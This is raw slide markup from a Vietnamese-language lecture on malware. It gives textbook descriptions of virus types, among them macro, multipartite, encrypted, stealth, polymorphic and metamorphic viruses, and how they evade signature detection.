            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mã macro</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> hoặc mã script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="240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được </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>biên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dịch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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bởi một ứng dụng.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>multipartite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>lây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> nhiễm file theo nhiều cách, có khả năng lây nhiễm nhiều loại file</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">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endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="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0054591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idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1606378"/>
            <a:ext cx="9825644" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>D</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ựa trên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> cách che dấu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>encrypted virus</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Dạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> virus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sử</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dụng</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mã</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hóa</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để</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làm</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rối</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nội</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> dung </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>của</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nó</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Một</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phần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của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> v</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>irus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tạo ra một khoá mã hóa ngẫu nhiên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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được lưu trữ cùng với </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>virus)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> và mã hóa phần còn lại của virut. Khi một chương trình bị nhiễm được gọi, virus sử dụng khóa ngẫu nhiên được lưu trữ để giải mã virus. Khi virus nhân bản, một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>khóa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> ngẫu nhiên khác được chọn.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Vì</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phần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lớn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> virus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>loại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này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dụng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khóa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nhau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mỗi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thể</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mẫu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> bit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cố</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nào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để</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phát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hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>stealth virus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="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Một dạng virus được thiết kế để tự ẩn mình khỏi sự phát hiện của phần mềm chống virus. Vì vậy, toàn bộ virus, không chỉ là một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>được ẩn.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thể</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dụng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đột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biến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nén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hoặc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kỹ</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thuật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> rootkit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>để</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ẩn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9984D7F9-3B53-411C-833F-46F8FD28BCE5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền lây nhiễm nội dung – Virus</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="199397907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idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1606378"/>
            <a:ext cx="9825644" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>D</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ựa trên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> cách che dấu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>polymorphic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>virus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="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Một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>virus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"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thể</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> đột biến với m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ỗi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> lần </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>lây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> nhiễm, tạo ra các “signature” khác nhau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="240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làm cho </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>việc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> phát hiện </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>bằng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>“signature” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>của </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>virus không thể </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>được.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Để có đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợc biến thể, virus ngẫu nhiên chèn các lệnh không cần thiết hoặc tráo đổi thứ tự các lệnh độc lập nhau hoặc sử dụng mã hóa theo cách tự thay đổi phần  đột biến (tức phần của virus thực hiện sinh khóa và mã hóa/giải mã) với mỗi lần sử dụng.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>metamorphic virus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="240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Cũng giống như với </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>polymorphic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> virus. Sự khác biệt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>là </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>virus tự </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>viết lại </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>nó </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hoàn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>toàn tại mỗi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>lần lặp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, sử dụng nhiều kỹ thuật chuyển đổi, có “signature” và hành vi “behavior” khác nhau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" i="1"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9984D7F9-3B53-411C-833F-46F8FD28BCE5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền lây nhiễm nội dung – Virus</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
